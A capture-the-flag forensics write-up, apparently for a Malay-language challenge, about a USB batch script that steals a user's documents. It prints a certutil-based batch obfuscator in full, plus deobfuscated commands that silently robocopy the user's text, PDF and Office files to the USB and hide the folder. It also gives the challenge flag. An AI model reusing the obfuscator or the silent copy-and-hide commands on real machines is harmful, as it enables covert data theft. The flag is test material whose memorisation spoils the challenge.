# Operation Nyet

> Pada suatu hari, ketika Khairul Aming meninggalkan laptopnya tanpa pengawasan, seorang staf menyambungkan USB miliknya ke laptop tersebut dan melakukan sesuatu.
> 
> Beberapa saat kemudian, dia mencabut USB itu dan beredar. Tindakannya tidak disedari Khairul Aming, namun sempat diperhatikan oleh seorang rakan sekerja yang berasa curiga.
>
> Beberapa jam kemudian, USB tersebut secara cuai ditinggalkan di atas mejanya. Rakan sekerja itu mengambil USB tersebut kerana ingin mengetahui rahsia di dalamnya.
>
> Kini, tugas anda adalah untuk menyiasat isi kandungan USB tersebut melalui fail imej forensik yang diberikan (.E01).

## Solution
Open E01 file using FTK Imager, noticed that there are batch script on Desktop.
`obf.bat` is taking available batch file, creates a second batch file (`USBBackup___ .bat`) that contains the cls command. So in effect, it prepends a `cls` command (clear screen) to the original batch file using Base64.

```
@echo off
if "%~1"=="" exit /b
if /i "%~x1" neq ".bat" if /i "%~x1" neq ".cmd" exit /b
for /f %%i in ("certutil.exe") do if not exist "%%~$path:i" (
  echo CertUtil.exe not found
  pause
  exit /b
)
>"temp.~b64" echo(//4mY2xzDQo=
certutil.exe -f -decode "temp.~b64" "%~n1___%~x1"
del "temp.~b64"
copy "%~n1___%~x1" /b + "%~1" /b
```                                         
Looking at `USBBackup___ .bat`, it contains some variable obfuscation. 
<img width="677" height="641" alt="image" src="https://github.com/user-attachments/assets/cecde3cb-aa58-4a02-8d31-6e53e93cb2e5" />


This batch script you shared is heavily obfuscated, but after carefully untangling it, here’s what it’s actually doing:

## Step-by-step breakdown

1. Variable obfuscation
The script builds variables letter by letter.

```
%wjdk% "p1=%a1%%a2%"   → ro
%wjdk% "p2=%a3%%a4%"   → bo
%wjdk% "p3=%a5%%a6%"   → co
%wjdk% "p4=%a7%%a8%"   → py
%wjdk% "rcmd=%p1%%p2%%p3%%p4%"

```
Together, `%rcmd%` = `robocopy`. So it’s preparing to run robocopy.

3. Setting directories

```
set "userProfile=C:\Users\Aming"
set "Loc=%~d0\OperationNyet"
```
`Loc` → creates a hidden system directory called `OperationNyet` on the same drive where the script is launched.

3. Constructing encoded string NYET

It concatenates pieces like MzEwOH … RfcmFoc2 … lhX255ZX … RfbnlldH0=, which probably flag in Base64 format/
```
tmp1=!xA!!q7!     → "MzE" + "wOH"     = "MzEwOH"
tmp2=!jK!!X4!     → "tue" + "WV0"     = "tueWV0"
tmp3=!kQ!!Y9!     → "X25" + "5ZX"     = "X255ZX"
tmp4=!zn!!P2!     → "Rfcm" + "Foc2"   = "RfcmFoc2"
tmp5=!LM!!vZ!     → "lhX2" + "55ZX"   = "lhX255ZX"
tmp6=!aX!!d3!!uT! → "Rfbn" + "lldH" + "0=" = "RfbnlldH0="

NYET = tmp1 + tmp2 + tmp3 + tmp4 + tmp5 + tmp6
NYET = MzEwOHtueWV0X255ZXRfcmFoc2lhX255ZXRfbnlldH0=
3108{nyet_nyet_rahsia_nyet_nyet}
```

4. Data exfiltration to a hidden folder.
```
robocopy "C:\Users\Aming" "X:\OperationNyet" *.txt *.pdf *.docx *.xlsx *.xls /s /njh /njs /ndl /np /r:0 /w:0
```

It copies all text, PDF, Word, and Excel files from `C:\Users\Aming` into the hidden folder `\OperationNyet`

- Silent mode (`/njh /njs /ndl /np`) → no headers, no summary, no logging, no progress
- `/s` → includes subdirectories
- `/r:0 /w:0` → zero retries, no waiting

5. Hide evidence
```
mkdir "%Loc%"
attrib +h +s "%Loc%"
```
Makes the OperationNyet folder hidden + system, so users don’t see it easily in Explorer.


## Flag 
```
3108{nyet_nyet_rahsia_nyet_nyet}
```
